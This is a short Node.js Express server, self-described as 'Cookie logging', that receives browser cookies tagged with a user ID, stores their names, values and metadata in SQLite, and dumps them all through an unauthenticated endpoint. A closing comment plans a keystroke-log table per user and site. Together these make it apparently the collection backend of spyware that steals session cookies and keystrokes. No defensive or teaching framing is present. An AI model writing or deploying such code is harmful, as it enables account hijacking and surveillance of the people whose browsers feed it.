const express = require("express");
const app = express();
const port = 6900;

const sqlite3 = require("sqlite3");
const db = new sqlite3.Database(":memory");
db.run(
  "CREATE TABLE cookie (userId CHAR(10) NOT NULL, name VARCHAR DEFAULT '', value VARCHAR DEFAULT '', metadata VARCHAR DEFAULT '')"
);
/*
  CREATE TABLE cookie (
	userId CHAR(10) NOT NULL,
	name VARCHAR DEFAULT '',
	value VARCHAR DEFAULT '',
	metadata VARCHAR DEFAULT '',
  )
  */

app.use(express.json());

app.get("/show-cookies", (req, res) => {
  db.all("SELECT * FROM cookie", [], (err, rows) => {
    if (err) {
      console.log(err);
    } else {
      res.send(JSON.stringify(rows));
    }
  });
  console.log(req.query);
});

app.post("/cookie", (req, res) => {
  res.send(JSON.stringify(req.body.data));
  if (!checkID(req.headers.uid)) return; //verify UID
  req.body.data.forEach((cookie) => {
    db.run(
      "INSERT INTO cookie (userId, name, value, metadata) VALUES (?, ?, ?, ?)",
      [req.headers.uid, cookie.name, cookie.value, getMetadata(cookie)]
    );
  });
});

app.listen(port, () => {
  console.log(`Cookie logging listening at http://localhost:${port}`);
});

function checkID(uid) {
  return uid ? uid.length === 10 : false;
}

function getMetadata(cookie) {
  let meta = {};
  for (const key in cookie) {
    if (key === "name" || key === "value") continue;
    meta[key] = cookie[key];
  }
  return JSON.stringify(meta);
}

/**
 * DB Setup
 * cookies table:
 *  userID, name, value, metadata (every other info except value and name)
 * keylogs table:
 *  userID, site, keystrokes
 */
